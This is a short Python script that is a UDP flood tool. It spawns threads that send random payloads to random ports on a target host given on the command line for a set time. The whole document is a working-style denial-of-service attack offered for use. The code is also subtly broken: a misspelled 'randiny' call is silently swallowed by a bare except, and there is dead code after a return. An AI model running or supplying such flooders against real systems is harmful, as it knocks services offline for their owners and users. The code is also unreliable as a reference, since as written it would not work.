import socket, random, threading, sys, time

try:
	target = str(sys.argv[1])
	threads = int(sys.argv[2])
	timer = float(sys.argv[3])
except IndexError:
	print("target threads time")
	sys.exit()

timeout = time.time() + 1 * timer

def attack():
	try:
		bytes = random._urandom(1024)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while time.time() < timeout:
			dport = random.randint(20,55500)
			sock.sendto(bytes*random.randiny(5,15), (target, dport))
		return
		sys.exit()
	except:
		pass

for x in range(0, threads):
	threading.Thread(target=attack).start()
	print(threading.active_count())